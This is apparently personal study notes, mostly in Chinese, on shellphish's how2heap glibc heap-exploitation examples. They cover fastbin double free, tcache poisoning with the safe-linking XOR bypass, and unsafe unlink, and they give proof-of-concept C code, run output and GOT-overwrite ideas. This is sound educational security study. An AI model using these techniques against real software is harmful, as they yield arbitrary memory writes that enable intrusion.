# Reference:
https://github.com/shellphish/how2heap/tree/master
https://www.giantbranch.cn/2017/09/29/how2heap%E5%AD%A6%E4%B9%A0/
# 1.0 first-fit
不是 攻击 只是一个structure 概念 
```
char* a = malloc(0x512);
char* b = malloc(0x256);
free(a) 
c = malloc(0x500);
```
只要 malloc c size < free a 的 size 
c 就会 占 a 的 allocation 
就是
```
0x5567377d6420 A
0x5567377d6630 B
free A -> [0x5567377d6420]
0x5567377d6420 c
-> []
```

# 2.0 fastbin_dup
double free 的感觉
```
int *a = calloc(1, 8);
int *b = calloc(1, 8);
int *c = calloc(1, 8);
free(a);
free(b);
free(a);
a = calloc(1, 8);
b = calloc(1, 8);
c = calloc(1, 8);
```
如果 malloc 了  A B C 
这时候 free A 后 就不能再 free A 了 会报错
因为 free list 最前面是 A
可是 如果我们 free B 后 还可以再 free A
malloc  E D F 
这个时候 E = A, D = B, F = A
```
1st malloc(8): 0x5565d7d0b420 A
2nd malloc(8): 0x5565d7d0b440 B
3rd malloc(8): 0x5565d7d0b460 C
free(a) -> [0x5565d7d0b420]
free(b) -> [0x5565d7d0b440,0x5565d7d0b420]
free(a) -> [0x5565d7d0b420,0x5565d7d0b440,0x5565d7d0b420]
1st malloc(8): 0x5565d7d0b420 E = A 
2nd malloc(8): 0x5565d7d0b440 D = B 
3rd malloc(8): 0x5565d7d0b420 F = A
-> []
```

# 3.0 fastbin_dup_into_stack 2.23 no tcache
如果要改 libc 版本
```shell
改 version
H2H_USE_SYSTEM_LIBC=N make v2.23

恢复
make clean base
```

这个结论是 可以用double free 改 return address 为 stack 上面的位置
```
int *a = malloc(1, 8);
int *b = malloc(1, 8);
int *c = malloc(1, 8);
free(a);
free(b);
free(a);
unsigned long long *d = malloc(8);
a = malloc(1, 8);
unsigned long long stack_var;
stack_var = 0x20;
*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
int *e = malloc(1, 8);
int *f = malloc(1, 8);
```
和 double free 概念一样
就是当 free list 还剩下 A 时候
其实我们已经 malloc 出一个 A
我们可以改这个malloc 出来的 A

怎样改？
xxx = 0x20 (一定要 是 0x20 这里是做 fake chunk
把可以控制的 A 改成 stack - 8 
下一次 malloc 的时候 A 就会出来
这个时候 free list 应该是 空的
可是再 malloc 一次  就会按 stack 的地址 + 0x10 出来 

结果
```
1st malloc(8): 0x559de864e010 A
2nd malloc(8): 0x559de864e030 B
3rd malloc(8): 0x559de864e050 C
free(a) -> [0x559de864e010]
free(b) -> [0x559de864e030,0x559de864e010]
free(a) -> [0x559de864e010,0x559de864e030,0x559de864e010]
1st malloc(8): 0x559de864e010 D = A 
2nd malloc(8): 0x559de864e030 E = B 
-> [0x559de864e010 A]
Now, we have access to 0x559de864e010 while it remains at the head of the free list
stack = 0x20 :  0x7ffd22f86028 STACK
*d =  0x7ffd22f86028 - 8 = 0x7ffd22f86020 <- 是value 不是address
3rd malloc(8): 0x559de864e010
-> []
4th malloc(8): 0x7ffd22f86030 <- 控制的地方是这里
```

# 4.0 fastbin_dup_into_stack 2.39 with tcache
with tcache 就有一点不同
需要先填满 tcache 
就是先 填满 7 次 然后再 free 完
```
void *ptrs[7];

	for (int i=0; i<7; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}
```
bypass 的方法也是有一点 不同
可是原理是一样的 
现在 double free 完了 free list 还有 A 

要让 MALLOC 出来的 A = A address >> 12 ^ stack address
0x5583c772e380 >> 12 = 0x5583c772e
0x5583c772e ^  stack address (0x7ffc14f9db70) = 0x7ff94cc5ac5e

虽然 我最后 进 A 的 value是 0x7ff94cc5ac5e
可是 我 ret 出的 address 还是 0x7ffc14f9db70 + 0x10

去绕过 safe link detection
```
1st malloc(8): 0x5583c772e380 A
2nd malloc(8): 0x5583c772e3a0 B
3rd malloc(8): 0x5583c772e3c0 C
free(a) -> [0x5583c772e380]
free(b) -> [0x5583c772e3a0,0x5583c772e380]
free(a) -> [0x5583c772e380,0x5583c772e3a0,0x5583c772e380]
1st malloc(8): 0x5583c772e380 D = A 
2nd malloc(8): 0x5583c772e3a0 E = B 
-> [0x5583c772e380 A]
Now, we have access to 0x5583c772e380 while it remains at the head of the free list
stack = 0x20 :  0x7ffc14f9db70 STACK
*d =  0x5583c772e380 >> 12 ^ 0x7ffc14f9db70 = 0x7ff94cc5ac5e <- 是value 不是address
3rd malloc(8): 0x5583c772e380
-> []
4th malloc(8): 0x7ffc14f9db80 <- 控制的地方是这里
```

question:
4.1 tache 是什么? 结构是怎样的?
4.2 为什么要填7 次？
4.3 为什么要 A = A address >> 12 ^ stack address？
4.4. 为什么 set d value 就可以 改 next chunk 
4.5 什么是 tcache poisoning
4.6 为什么返回 stack_address + 0x10?
[[QUESTION]]

challenge:
怎样利用？
# 5.0 unsafe_unlink 2.23 no tcache

free触发的unlink，以获得任意stack地址value的写能力
```

uint64_t *chunk0_ptr = (uint64_t*) malloc(0x80); //chunk0
uint64_t *chunk1_ptr  = (uint64_t*) malloc(0x80); //chunk1

chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3); // fake chunk fd
chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2); // fake chunk bk

uint64_t *chunk1_hdr = chunk1_ptr - 2;
chunk1_hdr[0] = 0x80;
chunk1_hdr[1] &= ~1;

free(chunk1_ptr);

char victim_string[8];
strcpy(victim_string,"Hello!~");
chunk0_ptr[3] = (uint64_t) victim_string;

chunk0_ptr[0] = 0x4141414142424242LL;

// sanity check
assert(*(long *)victim_string == 0x4141414142424242L);
```

steps
malloc size 0x80 A <- chunk0 (0x80是不要free后让他进fastbin)
malloc size 0x80 B <- chunk1
victim_string = Hello!~ <- stack 

全局指针 `chunk0_ptr` 本身的地址在0x602078，内存地址保存的数据为chunk0的地址0x603010

科普一下
堆 有自己的 address, variable 也有自己的 address
A = CHUNK 0
A 有自己的 address
CHUNK 0 也有自己的address 这边有 4块 
```
print(&CHUNK0_PTR)
CHUNK0_PTR = 0x601079 = A global varible
CHUNK0_PTR[0] = 0x1fd3010 <-  推地址 save size
CHUNK0_PTR[1] = 0x1fd3018 <-  ? chunk metadata
CHUNK0_PTR[2] = 0x1fd3020 <-  fd
CHUNK0_PTR[3] = 0x1fd3028 <-  bk
```

ok 回来
一堆奇怪的操作在chunk0_ptr 然后 free chunk1_ptr
```
?这个是做什么
chunk0_ptr[2] = &chunk0_ptr - 3
chunk0_ptr[3] = &chunk0_ptr - 2

就是要让 fd->bk=bk
fd->bk = bk;  --> (&chunk0_ptr - 3)->bk = (&chunk0_ptr - 2)
bk->fd = fd;  --> (&chunk0_ptr - 2)->fd = (&chunk0_ptr - 3)

&chunk0_ptr (0x601079)
     ↓
  chunk0_ptr → chunk0:
                [DATA]
                [DATA]
                [FD] = &chunk0_ptr - 3 
                [BK] = &chunk0_ptr - 2

为什么可以绕过 to be continue ...
if (P->fd->bk != P || P->bk->fd != P)
    abort();  // 检查失败
这个就是 check P 前 动 后 动 是不是 会回到 P || P 后 动 前 动 是不是 会回到 P
P->FD->bk == P + 3 
P->BK->fd == P + 2

所以
chunk0_ptr[0] 是指向 chunk 的数据区 0x1fd3010
chunk0_ptr[1]
chunk0_ptr[2] FD = P - 3
chunk0_ptr[3] BK = P - 2
```
这边是 simulate chunk0, 改chunk1 的metadata
```
?为什么要做chunk1_hdr 
chunk1_hdr = chunk1_ptr - 2;
chunk1_hdr[0] = 0x80; 
chunk1_hdr[1] &= ~1;

简单来讲是
[prev_size]     ← chunk1_hdr[0]，我们改它为 0x80
[size]          ← chunk1_hdr[1]，我们清除它的低位 PREV_IN_USE 位
[fd]            ← chunk1_ptr[0]
[bk]            ← chunk1_ptr[1]
[data...]       ← chunk1_ptr[2] 开始

为什么要set 0x80, clear PREV_IN_USE?
set 0x80 fake chunk 的大小（也就是 chunk0 的大小）
clear PREV_IN_USE? 告诉 glibc：前一个 chunk 是 free 的

ok 准备完毕 settle !!!!!!

free 掉 chunk1_ptr 
free(chunk1_ptr);

free 会做的东西
先 check 这个 chunk1_ptr free 了吗？ 然后我们把他Set free ed 所以
会找上一个 chunk1_ptr 上一个 malloc 就是 chunk0_ptr
然后 触发 unlink chunk0
unlink(P);
```
效果
chunk0_ptr[3] = victim_string;
chunk0_ptr[0] = 0x4141414142424242LL;
这个时候 victim_string = 0x4141414142424242LL

HOW?
```
chunk0_ptr: 0x55e76c62d050 堆地址
&chunk0_ptr: 0x55e76d301420 stack 地址
victim chunk1_ptr: 0x55e76d3014b0 堆地址

pass this check: (P->fd->bk != P || P->bk->fd != P) == False
chunk0_ptr[2] fd: 0x55e76c62d038  
chunk0_ptr[3] bk: 0x55e76c62d040

chunk1_ptr[0] size: 0x80
chunk1_ptr[1] PREV_IN_USE: 0 <- HEHEHE chunk0_ptr 被free了哟

free(chunk1_ptr) = unlink chunk0_ptr
chunk0_ptr[3] -> chunk0_ptr[0]

victim_string = "HELLO~"
chunk0_ptr BK = victim_string
chunk0_ptr = 0x4141414142424242LL
victim_string = 0x4141414142424242LL
```

问题：
1. 什么是unlink
Unlink故名思义，取消链接，是内存管理对堆块（chunk）的一种拆离手段。简单来说，就是将一个chunk从双向链表中拆离下来。显然，这种利用Unlink的手段针对的是除fastbin以外的其他几个bin链。
2. 2.32的 detection方式是什么
3. 为什么 chunk0_ptr[2] = &chunk0_ptr - 3， chunk0_ptr[3] = &chunk0_ptr - 2 可以绕过？

challenge:
怎样利用？
可以任意写
可以改free got = put got = 任意读

# 6.0 unsafe_unlink 2.32 with tcache
区别
```
为什么 0x420 //we want to be big enough not to use tcache or fastbin
*chunk0_ptr = malloc(0x420); //chunk0
*chunk1_ptr  = malloc(0x420); //chunk1

chunk0_ptr[1] = chunk0_ptr[-1] - 0x10; ?????? 
chunk0_ptr[2] = &chunk0_ptr - 3; // fake chunk fd
chunk0_ptr[3] = &chunk0_ptr - 2; // fake chunk bk

*chunk1_hdr = chunk1_ptr - 2;
chunk1_hdr[0] = 0x420;
chunk1_hdr[1] &= ~1;

free(chunk1_ptr);

victim_string = "Hello!~"
chunk0_ptr[3] = victim_string;

chunk0_ptr[0] = 0x4141414142424242LL;

// sanity check
assert(*(long *)victim_string == 0x4141414142424242L);
```

新的版本
```
if (__builtin_expect (chunksize(P) != prev_size (next_chunk (P)), 0))
    malloc_printerr ("corrupted size vs. prev_size");
```
当前 chunk 的 `size` 必须等于下一个 chunk 记录的 `prev_size`
人话：fake_chunk->size == chunk1_hdr[0]

```
chunk = {
    [0] prev_size      ← chunk0_ptr[-1] （如果前面 chunk 是 free 的才用）
    [1] size           ← chunk0_ptr[0]
    [2] user data ...  ← chunk0_ptr[1] 开始
}

所以
chunk0_ptr[-1] = chunk0 的 size
```

为什么要  -0x10
fake_chunk.size = chunk0_real_size - 0x10
真实 chunk size:   chunk0_ptr[-1] = 0x430
fake chunk 起始处离真实 chunk 起始偏移了 0x10 字节 ??????????
→ 所以 fake_chunk.size = 0x430 - 0x10 = 0x420

这样就可以
fake_chunk.size == chunk1_hdr[0] = 0x420;
